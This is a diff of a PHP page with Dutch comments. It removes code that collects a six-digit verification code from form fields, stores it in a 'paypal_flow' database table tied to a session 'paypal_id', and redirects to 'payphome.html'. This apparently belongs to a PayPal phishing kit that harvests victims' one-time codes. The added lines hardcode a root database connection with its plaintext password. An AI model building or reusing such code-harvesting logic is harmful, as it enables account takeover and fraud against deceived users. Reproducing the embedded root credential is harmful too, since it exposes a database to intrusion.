@@ -1,50 +1,8 @@
 <?php
-session_start();
+$conn = new mysqli('mysql.railway.internal', 'root', 'dKoENyxanuhrHlOuWovDKCbOMcJQKtFM', 'railway', 3306);
 
-// Debug: Zet foutmeldingen aan bij ontwikkeling
-ini_set('display_errors', 1);
-error_reporting(E_ALL);
-
-$error = '';
-
-if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    // Combineer de 6 losse codevelden
-    $codeParts = [];
-    for ($i = 1; $i <= 6; $i++) {
-        $part = $_POST["code$i"] ?? '';
-        if (!ctype_digit($part) || strlen($part) !== 1) {
-            $error = "Ongeldige invoer in veld $i.";
-            break;
-        }
-        $codeParts[] = $part;
-    }
-
-    if (empty($error)) {
-        $code = implode('', $codeParts);
-        $paypal_id = $_SESSION['paypal_id'] ?? null;
-
-        if ($paypal_id && strlen($code) === 6) {
-            $conn = new mysqli('localhost', 'root', '', 'my_base');
-            if ($conn->connect_error) {
-                die("Connectie mislukt: " . $conn->connect_error);
-            }
-
-            $stmt = $conn->prepare("UPDATE paypal_flow SET verification_code = ? WHERE id = ?");
-            $stmt->bind_param("si", $code, $paypal_id);
-            $stmt->execute();
-            $stmt->close();
-            $conn->close();
-
-            // Verwijder sessie-ID voor veiligheid
-            unset($_SESSION['paypal_id']);
-
-            // Redirect na succesvolle opslag
-            header("Location: payphome.html");
-            exit();
-        } else {
-            $error = 'Ongeldige sessie of onvolledige code.';
-        }
-    }
+if ($conn->connect_error) {
+    die("Connectie mislukt: " . $conn->connect_error);
 }
 ?>
 
